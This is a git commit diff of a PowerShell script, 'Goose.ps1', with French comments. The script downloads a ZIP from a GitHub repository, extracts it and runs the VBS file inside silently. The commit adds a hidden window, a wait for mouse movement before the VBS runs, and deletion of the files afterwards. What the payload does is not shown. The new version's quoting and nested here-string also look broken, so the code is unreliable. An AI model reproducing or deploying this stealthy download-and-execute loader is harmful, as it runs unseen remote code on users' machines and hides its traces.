0ac9e87d759dfca69bb2948e5aa311f3044220fb
ertvg <simjkl@hotmail.fr>
2025-01-26 23:38:00 +0100

    Update Goose.ps1

--- Goose.ps1
+++ Goose.ps1
@@ -1,24 +1,50 @@
-# Chemin temporaire pour stocker le fichier ZIP
-$tempZipPath = "$env:TEMP\Goose.zip"
-$tempExtractPath = "$env:TEMP\Goose"
+# Masquer la fenêtre PowerShell
+$windowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$process = Start-Process "powershell.exe" -ArgumentList "-Command & { 
 
-# Téléchargement du fichier ZIP depuis l'URL
-Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath
+    # Chemin temporaire pour stocker le fichier ZIP
+    $tempZipPath = '$env:TEMP\Goose.zip'
+    $tempExtractPath = '$env:TEMP\Goose'
 
-# Extraction du fichier ZIP
-Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath
+    # Téléchargement du fichier ZIP depuis l'URL
+    Invoke-WebRequest -Uri 'https://github.com/ertvg/h/raw/main/Goose.zip' -OutFile $tempZipPath
 
-# Chemin du fichier VBS à exécuter
-$vbsFilePath = "$tempExtractPath\Goose.vbs"
+    # Extraction du fichier ZIP
+    Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath
 
-# Vérifier si le fichier VBS existe
-if (Test-Path $vbsFilePath) {
-    # Exécution du fichier VBS
-    cscript.exe //B //Nologo $vbsFilePath
-} else {
-    Write-Host "Le fichier Goose.vbs n'a pas été trouvé."
-}
+    # Chemin du fichier VBS à exécuter
+    $vbsFilePath = '$tempExtractPath\Goose.vbs'
 
-# Optionnel: Supprimer les fichiers temporaires après exécution
-Remove-Item -Path $tempZipPath -Force
-Remove-Item -Path $tempExtractPath -Recurse -Force
+    # Détection du mouvement de la souris
+    Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Mouse {
+            [DllImport("user32.dll")]
+            public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
+        }
+"@
+    $lastPos = New-Object System.Drawing.Point
+    $currentPos = New-Object System.Drawing.Point
+
+    while ($true) {
+        [Mouse]::GetCursorPos([ref]$currentPos)
+        if ($currentPos -ne $lastPos) {
+            # Si un mouvement de souris est détecté, exécuter le fichier VBS
+            if (Test-Path $vbsFilePath) {
+                cscript.exe //B //Nologo $vbsFilePath
+                break
+            } else {
+                Write-Host 'Le fichier Goose.vbs n\'a pas été trouvé.'
+                break
+            }
+        }
+        $lastPos = $currentPos
+        Start-Sleep -Seconds 1
+    }
+
+    # Optionnel: Nettoyer les fichiers temporaires après l'exécution
+    Remove-Item -Path $tempZipPath -Force
+    Remove-Item -Path $tempExtractPath -Recurse -Force
+}" -WindowStyle $windowStyle
+
